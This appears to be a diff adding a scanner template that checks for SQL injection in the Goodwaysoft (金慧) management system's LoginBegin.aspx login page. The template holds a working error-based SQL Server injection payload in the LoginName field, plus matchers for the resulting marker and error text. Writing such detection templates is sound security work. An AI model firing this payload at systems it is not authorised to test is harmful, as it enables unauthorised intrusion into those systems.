@@ -1,0 +1,28 @@
+id: poc-yaml-goodwaysoft-loginbegin-aspx-sqli
+info:
+  name: 金慧综合管理信息系统 LoginBegin.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /Portal/LoginBegin.aspx?ReturnUrl=%2f HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Todo=Validate&LoginName=1%27+AND+5094+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285094%3D5094%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29+AND+%27JKJg%27%3D%27JKJg&Password=&CDomain=Local&FromUrl=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "在将 varchar 值"
+          - "qbpxq1qkvxq"
+          - "转换成数据类型 int 时失败"
+      - type: word
+        words:
+          - "<"
+        negative: true
